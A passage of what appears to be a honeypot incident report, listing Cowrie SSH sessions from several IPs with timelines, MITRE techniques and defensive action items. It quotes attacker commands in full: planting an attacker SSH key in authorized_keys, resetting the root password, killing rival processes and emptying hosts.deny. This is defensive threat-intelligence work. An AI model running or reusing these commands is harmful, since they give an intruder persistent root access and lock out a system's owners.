| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:04:24` | `cowrie.session.connect` |
| `2026-05-25 13:04:25` | `cowrie.client.version` |
| `2026-05-25 13:04:25` | `cowrie.client.kex` |
| `2026-05-25 13:04:26` | `cowrie.login.success` |
| `2026-05-25 13:04:26` | `cowrie.session.params` |
| `2026-05-25 13:04:26` | `cowrie.command.input` |
| `2026-05-25 13:04:26` | `cowrie.command.failed` |
| `2026-05-25 13:04:26` | `cowrie.log.closed` |
| `2026-05-25 13:04:27` | `cowrie.session.params` |
| `2026-05-25 13:04:27` | `cowrie.command.input` |
| `2026-05-25 13:04:27` | `cowrie.session.file_download` |
| `2026-05-25 13:04:27` | `cowrie.log.closed` |
| `2026-05-25 13:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]141` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b895c07c2a3

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]141` |
| **First Seen** | 2026-05-25 13:04 |
| **Last Seen** | 2026-05-25 13:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:04:35` | `cowrie.session.connect` |
| `2026-05-25 13:04:37` | `cowrie.client.version` |
| `2026-05-25 13:04:37` | `cowrie.client.kex` |
| `2026-05-25 13:04:37` | `cowrie.login.success` |
| `2026-05-25 13:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]141` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45ecde930f19

| Field | Detail |
|---|---|
| **Source IP** | `197.140.18[.]248` |
| **First Seen** | 2026-05-25 13:21 |
| **Last Seen** | 2026-05-25 13:22 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:rKG6XEczJkxz"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:21:40` | `cowrie.session.connect` |
| `2026-05-25 13:21:40` | `cowrie.client.version` |
| `2026-05-25 13:21:40` | `cowrie.client.kex` |
| `2026-05-25 13:21:41` | `cowrie.login.success` |
| `2026-05-25 13:21:41` | `cowrie.session.params` |
| `2026-05-25 13:21:41` | `cowrie.command.input` |
| `2026-05-25 13:21:41` | `cowrie.command.failed` |
| `2026-05-25 13:21:41` | `cowrie.log.closed` |
| `2026-05-25 13:21:42` | `cowrie.session.params` |
| `2026-05-25 13:21:42` | `cowrie.command.input` |
| `2026-05-25 13:21:42` | `cowrie.session.file_download` |
| `2026-05-25 13:21:42` | `cowrie.log.closed` |
| `2026-05-25 13:21:58` | `cowrie.session.params` |
| `2026-05-25 13:21:58` | `cowrie.command.input` |
| `2026-05-25 13:21:58` | `cowrie.log.closed` |
| `2026-05-25 13:21:58` | `cowrie.session.params` |
| `2026-05-25 13:21:58` | `cowrie.command.input` |
| `2026-05-25 13:21:59` | `cowrie.log.closed` |
| `2026-05-25 13:21:59` | `cowrie.session.params` |
| `2026-05-25 13:21:59` | `cowrie.command.input` |
| `2026-05-25 13:21:59` | `cowrie.session.file_download` |
| `2026-05-25 13:21:59` | `cowrie.log.closed` |
| `2026-05-25 13:21:59` | `cowrie.session.params` |
| `2026-05-25 13:21:59` | `cowrie.command.input` |
| `2026-05-25 13:22:00` | `cowrie.log.closed` |
| `2026-05-25 13:22:00` | `cowrie.session.params` |
| `2026-05-25 13:22:00` | `cowrie.command.input` |
| `2026-05-25 13:22:00` | `cowrie.log.closed` |
| `2026-05-25 13:22:00` | `cowrie.session.params` |
| `2026-05-25 13:22:00` | `cowrie.command.input` |
| `2026-05-25 13:22:00` | `cowrie.command.input` |
| `2026-05-25 13:22:00` | `cowrie.log.closed` |
| `2026-05-25 13:22:01` | `cowrie.session.params` |
| `2026-05-25 13:22:01` | `cowrie.command.input` |
| `2026-05-25 13:22:01` | `cowrie.log.closed` |
| `2026-05-25 13:22:01` | `cowrie.session.params` |
| `2026-05-25 13:22:01` | `cowrie.command.input` |
| `2026-05-25 13:22:01` | `cowrie.log.closed` |
| `2026-05-25 13:22:02` | `cowrie.session.params` |
| `2026-05-25 13:22:02` | `cowrie.command.input` |
| `2026-05-25 13:22:02` | `cowrie.log.closed` |
| `2026-05-25 13:22:02` | `cowrie.session.params` |
| `2026-05-25 13:22:02` | `cowrie.command.input` |
| `2026-05-25 13:22:02` | `cowrie.log.closed` |
| `2026-05-25 13:22:02` | `cowrie.session.params` |
| `2026-05-25 13:22:02` | `cowrie.command.input` |
| `2026-05-25 13:22:03` | `cowrie.log.closed` |
| `2026-05-25 13:22:03` | `cowrie.session.params` |
| `2026-05-25 13:22:03` | `cowrie.command.input` |
| `2026-05-25 13:22:03` | `cowrie.log.closed` |
| `2026-05-25 13:22:03` | `cowrie.session.params` |
| `2026-05-25 13:22:03` | `cowrie.command.input` |
| `2026-05-25 13:22:04` | `cowrie.log.closed` |
| `2026-05-25 13:22:04` | `cowrie.session.params` |
| `2026-05-25 13:22:04` | `cowrie.command.input` |
| `2026-05-25 13:22:04` | `cowrie.log.closed` |
| `2026-05-25 13:22:04` | `cowrie.session.params` |
| `2026-05-25 13:22:04` | `cowrie.command.input` |
| `2026-05-25 13:22:04` | `cowrie.log.closed` |
| `2026-05-25 13:22:05` | `cowrie.session.params` |
| `2026-05-25 13:22:05` | `cowrie.command.input` |
| `2026-05-25 13:22:05` | `cowrie.log.closed` |
| `2026-05-25 13:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.140.18[.]248` to AbuseIPDB if not already reported
- [ ] Block `197.140.18[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41673f623940

| Field | Detail |
|---|---|
| **Source IP** | `197.140.18[.]248` |
| **First Seen** | 2026-05-25 13:29 |
| **Last Seen** | 2026-05-25 13:30 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:N50V7uhyRV8I"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:29:43` | `cowrie.session.connect` |
| `2026-05-25 13:29:43` | `cowrie.client.version` |
| `2026-05-25 13:29:43` | `cowrie.client.kex` |
| `2026-05-25 13:29:43` | `cowrie.login.success` |
| `2026-05-25 13:29:44` | `cowrie.session.params` |
| `2026-05-25 13:29:44` | `cowrie.command.input` |
| `2026-05-25 13:29:44` | `cowrie.command.failed` |
| `2026-05-25 13:29:44` | `cowrie.log.closed` |
| `2026-05-25 13:29:44` | `cowrie.session.params` |
| `2026-05-25 13:29:44` | `cowrie.command.input` |
| `2026-05-25 13:29:44` | `cowrie.session.file_download` |
| `2026-05-25 13:29:44` | `cowrie.log.closed` |
| `2026-05-25 13:30:00` | `cowrie.session.params` |
| `2026-05-25 13:30:00` | `cowrie.command.input` |
| `2026-05-25 13:30:01` | `cowrie.log.closed` |
| `2026-05-25 13:30:01` | `cowrie.session.params` |
| `2026-05-25 13:30:01` | `cowrie.command.input` |
| `2026-05-25 13:30:01` | `cowrie.log.closed` |
| `2026-05-25 13:30:01` | `cowrie.session.params` |
| `2026-05-25 13:30:01` | `cowrie.command.input` |
| `2026-05-25 13:30:02` | `cowrie.session.file_download` |
| `2026-05-25 13:30:02` | `cowrie.log.closed` |
| `2026-05-25 13:30:02` | `cowrie.session.params` |
| `2026-05-25 13:30:02` | `cowrie.command.input` |
| `2026-05-25 13:30:02` | `cowrie.log.closed` |
| `2026-05-25 13:30:03` | `cowrie.session.params` |
| `2026-05-25 13:30:03` | `cowrie.command.input` |
| `2026-05-25 13:30:03` | `cowrie.log.closed` |
| `2026-05-25 13:30:03` | `cowrie.session.params` |
| `2026-05-25 13:30:03` | `cowrie.command.input` |
| `2026-05-25 13:30:03` | `cowrie.command.input` |
| `2026-05-25 13:30:03` | `cowrie.log.closed` |
| `2026-05-25 13:30:03` | `cowrie.session.params` |
| `2026-05-25 13:30:03` | `cowrie.command.input` |
| `2026-05-25 13:30:04` | `cowrie.log.closed` |
| `2026-05-25 13:30:04` | `cowrie.session.params` |
| `2026-05-25 13:30:04` | `cowrie.command.input` |
| `2026-05-25 13:30:04` | `cowrie.log.closed` |
| `2026-05-25 13:30:04` | `cowrie.session.params` |
| `2026-05-25 13:30:04` | `cowrie.command.input` |
| `2026-05-25 13:30:05` | `cowrie.log.closed` |
| `2026-05-25 13:30:05` | `cowrie.session.params` |
| `2026-05-25 13:30:05` | `cowrie.command.input` |
| `2026-05-25 13:30:05` | `cowrie.log.closed` |
| `2026-05-25 13:30:05` | `cowrie.session.params` |
| `2026-05-25 13:30:05` | `cowrie.command.input` |
| `2026-05-25 13:30:05` | `cowrie.log.closed` |
| `2026-05-25 13:30:06` | `cowrie.session.params` |
| `2026-05-25 13:30:06` | `cowrie.command.input` |
| `2026-05-25 13:30:06` | `cowrie.log.closed` |
| `2026-05-25 13:30:06` | `cowrie.session.params` |
| `2026-05-25 13:30:06` | `cowrie.command.input` |
| `2026-05-25 13:30:06` | `cowrie.log.closed` |
| `2026-05-25 13:30:06` | `cowrie.session.params` |
| `2026-05-25 13:30:06` | `cowrie.command.input` |
| `2026-05-25 13:30:07` | `cowrie.log.closed` |
| `2026-05-25 13:30:07` | `cowrie.session.params` |
| `2026-05-25 13:30:07` | `cowrie.command.input` |
| `2026-05-25 13:30:07` | `cowrie.log.closed` |
| `2026-05-25 13:30:07` | `cowrie.session.params` |
| `2026-05-25 13:30:07` | `cowrie.command.input` |
| `2026-05-25 13:30:07` | `cowrie.log.closed` |
| `2026-05-25 13:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.140.18[.]248` to AbuseIPDB if not already reported
- [ ] Block `197.140.18[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b19f65d1d66

| Field | Detail |
|---|---|
| **Source IP** | `197.140.18[.]248` |
| **First Seen** | 2026-05-25 13:41 |
| **Last Seen** | 2026-05-25 13:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:41:46` | `cowrie.session.connect` |
| `2026-05-25 13:41:46` | `cowrie.client.version` |
| `2026-05-25 13:41:46` | `cowrie.client.kex` |
| `2026-05-25 13:41:47` | `cowrie.login.success` |
| `2026-05-25 13:41:47` | `cowrie.session.params` |
| `2026-05-25 13:41:47` | `cowrie.command.input` |
| `2026-05-25 13:41:47` | `cowrie.command.failed` |
| `2026-05-25 13:41:47` | `cowrie.log.closed` |
| `2026-05-25 13:41:48` | `cowrie.session.params` |
| `2026-05-25 13:41:48` | `cowrie.command.input` |
| `2026-05-25 13:41:48` | `cowrie.session.file_download` |
| `2026-05-25 13:41:48` | `cowrie.log.closed` |
| `2026-05-25 13:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.140.18[.]248` to AbuseIPDB if not already reported
- [ ] Block `197.140.18[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9805848f32b6

| Field | Detail |
|---|---|
| **Source IP** | `197.140.18[.]248` |
| **First Seen** | 2026-05-25 13:41 |
| **Last Seen** | 2026-05-25 13:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:41:50` | `cowrie.session.connect` |
| `2026-05-25 13:41:50` | `cowrie.client.version` |
| `2026-05-25 13:41:50` | `cowrie.client.kex` |
| `2026-05-25 13:41:50` | `cowrie.login.success` |
| `2026-05-25 13:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.140.18[.]248` to AbuseIPDB if not already reported
- [ ] Block `197.140.18[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b196e83fa3

| Field | Detail |
|---|---|
| **Source IP** | `197.140.18[.]248` |
| **First Seen** | 2026-05-25 13:49 |
| **Last Seen** | 2026-05-25 13:50 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Vlj4hr3IMAF7"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:49:50` | `cowrie.session.connect` |
| `2026-05-25 13:49:50` | `cowrie.client.version` |
| `2026-05-25 13:49:50` | `cowrie.client.kex` |
| `2026-05-25 13:49:51` | `cowrie.login.success` |
| `2026-05-25 13:49:51` | `cowrie.session.params` |
| `2026-05-25 13:49:51` | `cowrie.command.input` |
| `2026-05-25 13:49:51` | `cowrie.command.failed` |
| `2026-05-25 13:49:51` | `cowrie.log.closed` |
| `2026-05-25 13:49:51` | `cowrie.session.params` |
| `2026-05-25 13:49:51` | `cowrie.command.input` |
| `2026-05-25 13:49:52` | `cowrie.session.file_download` |
| `2026-05-25 13:49:52` | `cowrie.log.closed` |
| `2026-05-25 13:50:02` | `cowrie.session.params` |
| `2026-05-25 13:50:02` | `cowrie.command.input` |
| `2026-05-25 13:50:02` | `cowrie.log.closed` |
| `2026-05-25 13:50:02` | `cowrie.session.params` |
| `2026-05-25 13:50:02` | `cowrie.command.input` |
| `2026-05-25 13:50:02` | `cowrie.log.closed` |
| `2026-05-25 13:50:03` | `cowrie.session.params` |
| `2026-05-25 13:50:03` | `cowrie.command.input` |
| `2026-05-25 13:50:03` | `cowrie.session.file_download` |
| `2026-05-25 13:50:03` | `cowrie.log.closed` |
| `2026-05-25 13:50:03` | `cowrie.session.params` |
| `2026-05-25 13:50:03` | `cowrie.command.input` |
| `2026-05-25 13:50:03` | `cowrie.log.closed` |
| `2026-05-25 13:50:04` | `cowrie.session.params` |
| `2026-05-25 13:50:04` | `cowrie.command.input` |
| `2026-05-25 13:50:04` | `cowrie.log.closed` |
| `2026-05-25 13:50:04` | `cowrie.session.params` |
| `2026-05-25 13:50:04` | `cowrie.command.input` |
| `2026-05-25 13:50:04` | `cowrie.command.input` |
| `2026-05-25 13:50:04` | `cowrie.log.closed` |
| `2026-05-25 13:50:04` | `cowrie.session.params` |
| `2026-05-25 13:50:04` | `cowrie.command.input` |
| `2026-05-25 13:50:05` | `cowrie.log.closed` |
| `2026-05-25 13:50:05` | `cowrie.session.params` |
| `2026-05-25 13:50:05` | `cowrie.command.input` |
| `2026-05-25 13:50:05` | `cowrie.log.closed` |
| `2026-05-25 13:50:05` | `cowrie.session.params` |
| `2026-05-25 13:50:05` | `cowrie.command.input` |
| `2026-05-25 13:50:06` | `cowrie.log.closed` |
| `2026-05-25 13:50:06` | `cowrie.session.params` |
| `2026-05-25 13:50:06` | `cowrie.command.input` |
| `2026-05-25 13:50:06` | `cowrie.log.closed` |
| `2026-05-25 13:50:06` | `cowrie.session.params` |
| `2026-05-25 13:50:06` | `cowrie.command.input` |
| `2026-05-25 13:50:06` | `cowrie.log.closed` |
| `2026-05-25 13:50:07` | `cowrie.session.params` |
| `2026-05-25 13:50:07` | `cowrie.command.input` |
| `2026-05-25 13:50:07` | `cowrie.log.closed` |
| `2026-05-25 13:50:07` | `cowrie.session.params` |
| `2026-05-25 13:50:07` | `cowrie.command.input` |
| `2026-05-25 13:50:07` | `cowrie.log.closed` |
| `2026-05-25 13:50:07` | `cowrie.session.params` |
| `2026-05-25 13:50:07` | `cowrie.command.input` |
| `2026-05-25 13:50:08` | `cowrie.log.closed` |
| `2026-05-25 13:50:08` | `cowrie.session.params` |
| `2026-05-25 13:50:08` | `cowrie.command.input` |
| `2026-05-25 13:50:08` | `cowrie.log.closed` |
| `2026-05-25 13:50:08` | `cowrie.session.params` |
| `2026-05-25 13:50:08` | `cowrie.command.input` |
| `2026-05-25 13:50:08` | `cowrie.log.closed` |
| `2026-05-25 13:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.140.18[.]248` to AbuseIPDB if not already reported
- [ ] Block `197.140.18[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9141c6a1736d

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 13:54 |
| **Last Seen** | 2026-05-25 13:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:54:00` | `cowrie.session.connect` |
| `2026-05-25 13:54:00` | `cowrie.client.version` |
| `2026-05-25 13:54:00` | `cowrie.client.kex` |
| `2026-05-25 13:54:01` | `cowrie.login.success` |
| `2026-05-25 13:54:02` | `cowrie.session.params` |
| `2026-05-25 13:54:02` | `cowrie.command.input` |
| `2026-05-25 13:54:02` | `cowrie.command.failed` |
| `2026-05-25 13:54:02` | `cowrie.log.closed` |
| `2026-05-25 13:54:03` | `cowrie.session.params` |
| `2026-05-25 13:54:03` | `cowrie.command.input` |
| `2026-05-25 13:54:03` | `cowrie.session.file_download` |
| `2026-05-25 13:54:03` | `cowrie.log.closed` |
| `2026-05-25 13:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2e7c3baf0e

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 13:54 |
| **Last Seen** | 2026-05-25 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:54:06` | `cowrie.session.connect` |
| `2026-05-25 13:54:06` | `cowrie.client.version` |
| `2026-05-25 13:54:06` | `cowrie.client.kex` |
| `2026-05-25 13:54:07` | `cowrie.login.success` |
| `2026-05-25 13:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d577540784d

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-25 13:55 |
| **Last Seen** | 2026-05-25 13:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 13:55:58` | `cowrie.session.connect` |
| `2026-05-25 13:55:58` | `cowrie.client.version` |
| `2026-05-25 13:55:59` | `cowrie.client.kex` |
